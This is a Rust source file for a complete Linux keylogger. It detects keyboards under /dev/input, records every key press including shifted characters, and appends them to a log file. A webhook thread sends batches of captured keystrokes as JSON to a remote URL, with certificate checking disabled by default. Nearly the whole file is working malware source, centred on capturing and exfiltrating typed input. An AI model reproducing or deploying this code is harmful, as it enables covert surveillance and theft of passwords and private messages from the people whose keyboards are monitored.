use evdev::{Device, EventType, InputEventKind, Key};
use std::fs::OpenOptions;
use std::io::Write;
use std::os::unix::io::AsRawFd;
use std::env;
use chrono::Local;
use nix::fcntl::{FcntlArg, OFlag};
use nix::sys::epoll::{self, EpollEvent, EpollFlags, EpollOp};
use nix::unistd;
use serde_json::json;
use std::sync::mpsc;
use std::thread;

struct KeystrokeData {
    timestamp: String,
    device: String,
    key: String,
}

pub fn run_keylogger(log_path: &str, webhook_url: Option<String>) {
    // Scan for all input devices
    let devices = evdev::enumerate()
        .collect::<Vec<_>>();

    if devices.is_empty() {
        eprintln!("No input devices found!");
        eprintln!("Make sure you have proper permissions to access /dev/input/event*");
        eprintln!("Try running with: sudo ./rust-key");
        std::process::exit(1);
    }

    // Filter for keyboard devices (including USB keyboards)
    let mut keyboards = Vec::new();
    
    for (path, device) in devices {
        // Check if device has keyboard capabilities
        // A real keyboard should support letter keys like KEY_A
        if let Some(keys) = device.supported_keys() {
            // Check if device supports basic letter keys (indicates it's a real keyboard)
            // We check for multiple letter keys across the keyboard to ensure it's a typing
            // keyboard, not just a device with a few control keys (like mice or audio controls)
            let has_letter_keys = keys.contains(Key::KEY_A) 
                && keys.contains(Key::KEY_Z)
                && keys.contains(Key::KEY_M)  // Middle of alphabet
                && keys.contains(Key::KEY_ENTER)
                && keys.contains(Key::KEY_SPACE);
            
            if has_letter_keys {
                let name = device.name().unwrap_or("Unknown");
                let phys = device.physical_path().unwrap_or("Unknown");
                
                println!("Found keyboard device:");
                println!("  Name: {}", name);
                println!("  Path: {:?}", path);
                println!("  Physical: {}", phys);
                
                // Check if it's a USB device
                if phys.contains("usb") {
                    println!("  Type: USB Keyboard");
                } else {
                    println!("  Type: Internal/Other");
                }
                println!();
                
                keyboards.push((path, name.to_string()));
            }
        }
    }

    if keyboards.is_empty() {
        eprintln!("No keyboard devices found!");
        std::process::exit(1);
    }

    println!("Monitoring {} keyboard device(s)...\n", keyboards.len());

    // Open log file
    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(log_path)
        .expect("Failed to open log file");

    // Monitor all keyboard devices
    let mut devices_to_monitor = Vec::new();
    for (path, name) in keyboards {
        match Device::open(&path) {
            Ok(device) => {
                writeln!(file, "Monitoring device: {} ({:?})", name, path)
                    .expect("Failed to write to log file");
                devices_to_monitor.push((device, name));
            }
            Err(e) => {
                eprintln!("Failed to open device {:?}: {}", path, e);
            }
        }
    }

    if devices_to_monitor.is_empty() {
        eprintln!("Failed to open any keyboard devices!");
        eprintln!("Make sure you run this with sudo or have proper permissions.");
        std::process::exit(1);
    }

    println!("Keylogger is now active and monitoring keyboards.");
    println!("Keys will be logged to: {}", log_path);
    if webhook_url.is_some() {
        println!("Keys will also be sent to the configured webhook URL.");
    }
    println!("Press Ctrl+C to stop.\n");
    
    writeln!(file, "=== Monitoring started, waiting for key events ===")
        .expect("Failed to write to log file");
    file.flush().expect("Failed to flush log file");

    // Set up webhook worker thread if URL is provided
    let webhook_sender = webhook_url.map(|url| {
        let (tx, rx) = mpsc::sync_channel::<KeystrokeData>(100); // Buffer up to 100 keystrokes
        
        // Clone log path for use in webhook thread
        let log_path_clone = log_path.to_string();
        
        // Spawn worker thread to handle webhook requests
        thread::spawn(move || {
            // Helper to log to file
            let log_to_file = |msg: &str| {
                if let Ok(mut f) = OpenOptions::new().create(true).append(true).open(&log_path_clone) {
                    let _ = writeln!(f, "[{}] WEBHOOK: {}", Local::now().format("%Y-%m-%d %H:%M:%S"), msg);
                    let _ = f.flush();
                }
            };
            
            log_to_file(&format!("Initializing webhook client for URL: {}", url));
            
            // Check if user wants to accept invalid certificates (for testing services)
            // Set RUST_KEY_ACCEPT_INVALID_CERTS=false to enforce strict certificate validation
            let accept_invalid_certs = env::var("RUST_KEY_ACCEPT_INVALID_CERTS")
                .unwrap_or_else(|_| "true".to_string())
                .to_lowercase() != "false";
            
            if accept_invalid_certs {
                log_to_file("⚠️  WARNING: Certificate validation is disabled for compatibility with testing services");
                log_to_file("⚠️  This makes the connection vulnerable to man-in-the-middle attacks");
                log_to_file("⚠️  Set RUST_KEY_ACCEPT_INVALID_CERTS=false for strict validation");
            } else {
                log_to_file("Certificate validation is enabled (strict mode)");
            }
            
            // Create HTTP client once
            let client = match reqwest::blocking::Client::builder()
                .timeout(std::time::Duration::from_secs(10))  // Increased from 5s to 10s
                .danger_accept_invalid_certs(accept_invalid_certs)
                .build() {
                Ok(c) => {
                    log_to_file("HTTP client created successfully");
                    c
                }
                Err(e) => {
                    let error_msg = format!("Failed to create HTTP client: {}", e);
                    eprintln!("{}", error_msg);
                    log_to_file(&error_msg);
                    log_to_file("Webhook functionality will be disabled");
                    return;
                }
            };
            
            // Test initial connectivity
            log_to_file("Testing initial connectivity to webhook...");
            match client.get(&url).send() {
                Ok(resp) => {
                    log_to_file(&format!("Initial connectivity test successful (HTTP {})", resp.status().as_u16()));
                }
                Err(e) => {
                    log_to_file(&format!("Initial connectivity test failed: {}", e));
                    log_to_file("Will continue anyway - POST requests may still work");
                    eprintln!("Warning: Initial webhook connectivity test failed: {}", e);
                    eprintln!("Continuing anyway - keystroke batches will be sent as they accumulate");
                }
            }
            
            const BATCH_SIZE: usize = 20; // Send in batches of 20 keystrokes
            const BATCH_TIMEOUT_MS: u64 = 2000; // Or send after 2 seconds
            
            // Helper function to create JSON payload from batch
            let create_payload = |batch: &[KeystrokeData]| {
                json!({
                    "keystrokes": batch.iter().map(|d| {
                        json!({
                            "timestamp": d.timestamp,
                            "device": d.device,
                            "key": d.key
                        })
                    }).collect::<Vec<_>>()
                })
            };
            
            let mut batch: Vec<KeystrokeData> = Vec::with_capacity(BATCH_SIZE);
            let mut last_send = std::time::Instant::now();
            
            // Process keystrokes from the channel
            loop {
                // Try to receive with a timeout to check batch conditions
                let timeout = std::time::Duration::from_millis(100);
                match rx.recv_timeout(timeout) {
                    Ok(data) => {
                        batch.push(data);
                        
                        // Check if batch is full or timeout has elapsed
                        let should_send = batch.len() >= BATCH_SIZE || 
                                        last_send.elapsed().as_millis() as u64 >= BATCH_TIMEOUT_MS;
                        
                        if should_send && !batch.is_empty() {
                            let payload = create_payload(&batch);
                            
                            match client.post(&url).json(&payload).send() {
                                Ok(resp) => {
                                    let status = resp.status().as_u16();
                                    if status >= 200 && status < 300 {
                                        log_to_file(&format!("Successfully sent batch of {} keystrokes (HTTP {})", batch.len(), status));
                                    } else {
                                        let error_msg = format!("Webhook returned non-success status: HTTP {} for batch of {} keystrokes", status, batch.len());
                                        eprintln!("{}", error_msg);
                                        log_to_file(&error_msg);
                                    }
                                }
                                Err(e) => {
                                    let error_msg = format!("Failed to send batch to webhook: {}", e);
                                    eprintln!("{}", error_msg);
                                    log_to_file(&error_msg);
                                }
                            }
                            
                            batch.clear();
                            last_send = std::time::Instant::now();
                        }
                    }
                    Err(mpsc::RecvTimeoutError::Timeout) => {
                        // Check if we should send accumulated batch due to timeout
                        if !batch.is_empty() && last_send.elapsed().as_millis() as u64 >= BATCH_TIMEOUT_MS {
                            let payload = create_payload(&batch);
                            
                            match client.post(&url).json(&payload).send() {
                                Ok(resp) => {
                                    let status = resp.status().as_u16();
                                    if status >= 200 && status < 300 {
                                        log_to_file(&format!("Successfully sent batch of {} keystrokes (HTTP {}) [timeout]", batch.len(), status));
                                    } else {
                                        let error_msg = format!("Webhook returned non-success status: HTTP {} for batch of {} keystrokes [timeout]", status, batch.len());
                                        eprintln!("{}", error_msg);
                                        log_to_file(&error_msg);
                                    }
                                }
                                Err(e) => {
                                    let error_msg = format!("Failed to send batch to webhook [timeout]: {}", e);
                                    eprintln!("{}", error_msg);
                                    log_to_file(&error_msg);
                                }
                            }
                            
                            batch.clear();
                            last_send = std::time::Instant::now();
                        }
                    }
                    Err(mpsc::RecvTimeoutError::Disconnected) => {
                        // Channel closed, send any remaining data
                        if !batch.is_empty() {
                            let payload = create_payload(&batch);
                            match client.post(&url).json(&payload).send() {
                                Ok(_) => {
                                    log_to_file(&format!("Sent final batch of {} keystrokes on shutdown", batch.len()));
                                }
                                Err(e) => {
                                    let error_msg = format!("Failed to send final batch on shutdown: {}", e);
                                    eprintln!("{}", error_msg);
                                    log_to_file(&error_msg);
                                }
                            }
                        }
                        log_to_file("Webhook thread shutting down");
                        break;
                    }
                }
            }
        });
        
        tx
    });

    // Create epoll instance
    let epoll_fd = epoll::epoll_create1(epoll::EpollCreateFlags::EPOLL_CLOEXEC)
        .expect("Failed to create epoll instance");

    // Set all devices to non-blocking mode and register them with epoll
    for (i, (device, _)) in devices_to_monitor.iter().enumerate() {
        let raw_fd = device.as_raw_fd();
        
        // Set non-blocking
        nix::fcntl::fcntl(raw_fd, FcntlArg::F_SETFL(OFlag::O_NONBLOCK))
            .expect("Failed to set non-blocking mode");
        
        // Register with epoll
        let mut event = EpollEvent::new(EpollFlags::EPOLLIN, i as u64);
        epoll::epoll_ctl(epoll_fd, EpollOp::EpollCtlAdd, raw_fd, Some(&mut event))
            .expect("Failed to register device with epoll");
    }

    let mut events = [EpollEvent::empty(); 10];
    
    // Track shift key state (true when shift is pressed)
    let mut shift_pressed = false;

    // Main event loop
    loop {
        // Wait for events on any device
        match epoll::epoll_wait(epoll_fd, &mut events, -1) {
            Ok(nfds) => {
                // Process events from devices that have data
                for event in &events[..nfds] {
                    let device_idx = event.data() as usize;
                    if device_idx < devices_to_monitor.len() {
                        let (device, device_name) = &mut devices_to_monitor[device_idx];
                        
                        match device.fetch_events() {
                            Ok(event_iter) => {
                                for ev in event_iter {
                                    if ev.event_type() == EventType::KEY {
                                        if let InputEventKind::Key(key) = ev.kind() {
                                            // Track shift key state
                                            if key == Key::KEY_LEFTSHIFT || key == Key::KEY_RIGHTSHIFT {
                                                if ev.value() == 1 {
                                                    // Shift pressed
                                                    shift_pressed = true;
                                                } else if ev.value() == 0 {
                                                    // Shift released
                                                    shift_pressed = false;
                                                }
                                                // Don't log shift key itself
                                                continue;
                                            }
                                            
                                            // Only log key press events (value == 1), not releases (value == 0) or repeats (value == 2)
                                            if ev.value() == 1 {
                                                let key_str = format_key(key, shift_pressed);
                                                let timestamp = Local::now().format("%Y-%m-%d %H:%M:%S%.3f");
                                                
                                                let log_entry = format!(
                                                    "[{}] [{}] Key: {}\n",
                                                    timestamp, device_name, key_str
                                                );
                                                
                                                // Write to file
                                                file.write_all(log_entry.as_bytes())
                                                    .expect("Failed to write to log file");
                                                file.flush().expect("Failed to flush log file");
                                                
                                                // Send to webhook if sender is available
                                                if let Some(ref sender) = webhook_sender {
                                                    let _ = sender.try_send(KeystrokeData {
                                                        timestamp: timestamp.to_string(),
                                                        device: device_name.to_string(),
                                                        key: key_str,
                                                    });
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                            Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                                // No more events available from this device right now
                            }
                            Err(e) => {
                                eprintln!("Error reading events from {}: {}", device_name, e);
                            }
                        }
                    }
                }
            }
            Err(e) => {
                eprintln!("Error waiting for events: {}", e);
                break;
            }
        }
    }

    // Cleanup
    let _ = unistd::close(epoll_fd);
}

fn format_key(key: Key, shift_pressed: bool) -> String {
    match key {
        // Letters - uppercase when shift is pressed
        Key::KEY_A => if shift_pressed { "A" } else { "a" }.to_string(),
        Key::KEY_B => if shift_pressed { "B" } else { "b" }.to_string(),
        Key::KEY_C => if shift_pressed { "C" } else { "c" }.to_string(),
        Key::KEY_D => if shift_pressed { "D" } else { "d" }.to_string(),
        Key::KEY_E => if shift_pressed { "E" } else { "e" }.to_string(),
        Key::KEY_F => if shift_pressed { "F" } else { "f" }.to_string(),
        Key::KEY_G => if shift_pressed { "G" } else { "g" }.to_string(),
        Key::KEY_H => if shift_pressed { "H" } else { "h" }.to_string(),
        Key::KEY_I => if shift_pressed { "I" } else { "i" }.to_string(),
        Key::KEY_J => if shift_pressed { "J" } else { "j" }.to_string(),
        Key::KEY_K => if shift_pressed { "K" } else { "k" }.to_string(),
        Key::KEY_L => if shift_pressed { "L" } else { "l" }.to_string(),
        Key::KEY_M => if shift_pressed { "M" } else { "m" }.to_string(),
        Key::KEY_N => if shift_pressed { "N" } else { "n" }.to_string(),
        Key::KEY_O => if shift_pressed { "O" } else { "o" }.to_string(),
        Key::KEY_P => if shift_pressed { "P" } else { "p" }.to_string(),
        Key::KEY_Q => if shift_pressed { "Q" } else { "q" }.to_string(),
        Key::KEY_R => if shift_pressed { "R" } else { "r" }.to_string(),
        Key::KEY_S => if shift_pressed { "S" } else { "s" }.to_string(),
        Key::KEY_T => if shift_pressed { "T" } else { "t" }.to_string(),
        Key::KEY_U => if shift_pressed { "U" } else { "u" }.to_string(),
        Key::KEY_V => if shift_pressed { "V" } else { "v" }.to_string(),
        Key::KEY_W => if shift_pressed { "W" } else { "w" }.to_string(),
        Key::KEY_X => if shift_pressed { "X" } else { "x" }.to_string(),
        Key::KEY_Y => if shift_pressed { "Y" } else { "y" }.to_string(),
        Key::KEY_Z => if shift_pressed { "Z" } else { "z" }.to_string(),

        // Numbers - show symbols when shift is pressed (US keyboard layout)
        Key::KEY_0 => if shift_pressed { ")" } else { "0" }.to_string(),
        Key::KEY_1 => if shift_pressed { "!" } else { "1" }.to_string(),
        Key::KEY_2 => if shift_pressed { "@" } else { "2" }.to_string(),
        Key::KEY_3 => if shift_pressed { "#" } else { "3" }.to_string(),
        Key::KEY_4 => if shift_pressed { "$" } else { "4" }.to_string(),
        Key::KEY_5 => if shift_pressed { "%" } else { "5" }.to_string(),
        Key::KEY_6 => if shift_pressed { "^" } else { "6" }.to_string(),
        Key::KEY_7 => if shift_pressed { "&" } else { "7" }.to_string(),
        Key::KEY_8 => if shift_pressed { "*" } else { "8" }.to_string(),
        Key::KEY_9 => if shift_pressed { "(" } else { "9" }.to_string(),

        // Special keys
        Key::KEY_SPACE => " ".to_string(),
        Key::KEY_ENTER => "\n[ENTER]\n".to_string(),
        Key::KEY_TAB => "\t[TAB]".to_string(),
        Key::KEY_BACKSPACE => "[BACKSPACE]".to_string(),
        Key::KEY_ESC => "[ESC]".to_string(),
        Key::KEY_LEFTCTRL | Key::KEY_RIGHTCTRL => "[CTRL]".to_string(),
        Key::KEY_LEFTALT | Key::KEY_RIGHTALT => "[ALT]".to_string(),
        Key::KEY_LEFTMETA | Key::KEY_RIGHTMETA => "[META]".to_string(),
        Key::KEY_CAPSLOCK => "[CAPSLOCK]".to_string(),
        
        // Punctuation - show shifted version when shift is pressed
        Key::KEY_COMMA => if shift_pressed { "<" } else { "," }.to_string(),
        Key::KEY_DOT => if shift_pressed { ">" } else { "." }.to_string(),
        Key::KEY_SLASH => if shift_pressed { "?" } else { "/" }.to_string(),
        Key::KEY_SEMICOLON => if shift_pressed { ":" } else { ";" }.to_string(),
        Key::KEY_APOSTROPHE => if shift_pressed { "\"" } else { "'" }.to_string(),
        Key::KEY_LEFTBRACE => if shift_pressed { "{" } else { "[" }.to_string(),
        Key::KEY_RIGHTBRACE => if shift_pressed { "}" } else { "]" }.to_string(),
        Key::KEY_BACKSLASH => if shift_pressed { "|" } else { "\\" }.to_string(),
        Key::KEY_MINUS => if shift_pressed { "_" } else { "-" }.to_string(),
        Key::KEY_EQUAL => if shift_pressed { "+" } else { "=" }.to_string(),
        Key::KEY_GRAVE => if shift_pressed { "~" } else { "`" }.to_string(),

        // Arrow keys
        Key::KEY_UP => "[UP]".to_string(),
        Key::KEY_DOWN => "[DOWN]".to_string(),
        Key::KEY_LEFT => "[LEFT]".to_string(),
        Key::KEY_RIGHT => "[RIGHT]".to_string(),

        // Function keys
        Key::KEY_F1 => "[F1]".to_string(),
        Key::KEY_F2 => "[F2]".to_string(),
        Key::KEY_F3 => "[F3]".to_string(),
        Key::KEY_F4 => "[F4]".to_string(),
        Key::KEY_F5 => "[F5]".to_string(),
        Key::KEY_F6 => "[F6]".to_string(),
        Key::KEY_F7 => "[F7]".to_string(),
        Key::KEY_F8 => "[F8]".to_string(),
        Key::KEY_F9 => "[F9]".to_string(),
        Key::KEY_F10 => "[F10]".to_string(),
        Key::KEY_F11 => "[F11]".to_string(),
        Key::KEY_F12 => "[F12]".to_string(),

        // Other common keys
        Key::KEY_DELETE => "[DELETE]".to_string(),
        Key::KEY_INSERT => "[INSERT]".to_string(),
        Key::KEY_HOME => "[HOME]".to_string(),
        Key::KEY_END => "[END]".to_string(),
        Key::KEY_PAGEUP => "[PAGEUP]".to_string(),
        Key::KEY_PAGEDOWN => "[PAGEDOWN]".to_string(),

        // Shift keys should never reach here as they're filtered out
        Key::KEY_LEFTSHIFT | Key::KEY_RIGHTSHIFT => "".to_string(),

        // Default for unmapped keys
        _ => format!("[{:?}]", key),
    }
}
